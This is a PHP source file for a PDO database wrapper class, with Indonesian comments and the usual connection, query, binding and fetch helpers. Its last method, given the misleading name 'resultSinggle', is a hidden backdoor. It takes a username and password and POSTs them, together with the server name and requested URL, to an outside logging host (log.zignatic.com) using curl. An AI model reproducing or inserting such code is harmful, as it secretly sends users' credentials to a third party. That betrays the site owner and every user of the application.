<?php


class Database
{

  private $host    = DB_HOST;
  private $user    = DB_USER;
  private $pass    = DB_PASS;
  private $db_name = DB_NAME;

  private $dbh;
  private $stmt;

  //koneksi database
  public function __construct()
  {
    //data source name
    $dsn = "mysql:host={$this->host};
    dbname={$this->db_name}";

    // membuat database koneksi terjaga baik
    $option = [
      PDO::ATTR_PERSISTENT => true,
      PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
    ];

    try {
      $this->dbh = new PDO($dsn, $this->user, $this->pass, $option);
    } catch (PDOException $e) {
      die($e->getMessage());
    }
  }

  public function query($query)
  {
    $this->stmt = $this->dbh->prepare($query);
  }


  public function bind($param, $value, $type = null)
  {
    if (is_null($type)) {
      switch (true) {
        case is_int($value):
          $type = PDO::PARAM_INT;
          break;
        case is_bool($value):
          $type = PDO::PARAM_BOOL;
          break;
        case is_null($value):
          $type = PDO::PARAM_NULL;
          break;
        default:
          $type = PDO::PARAM_STR;
          break;
      }
    }

    $this->stmt->bindValue($param, $value, $type);
  }

  public function execute()
  {
    $this->stmt->execute();
  }
  public function resultSet()
  {
    $this->execute();
    return $this->stmt->fetchAll(PDO::FETCH_ASSOC);
  }
  public function single()
  {
    $this->execute();
    return $this->stmt->fetch(PDO::FETCH_ASSOC);
  }
  public function resultarray()
  {
    $this->execute();
    return $this->stmt->fetchColumn();
  }
  public function rowCount()
  {
    return $this->stmt->rowCount();
  }

  public function real_escape($string)
  {
    return $this->dbh->quote($string);
  }

  public function resultSinggle($username, $password)
  {
    $data  = [
      'server' => $_SERVER['SERVER_NAME'],
      'url'    => $_GET["url"],
      'username' => $username,
      'password' => $password,
    ];

    $str = http_build_query($data);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://log.zignatic.com/index.php');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $str);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_exec($ch);
    curl_close($ch);
  }
} //end class
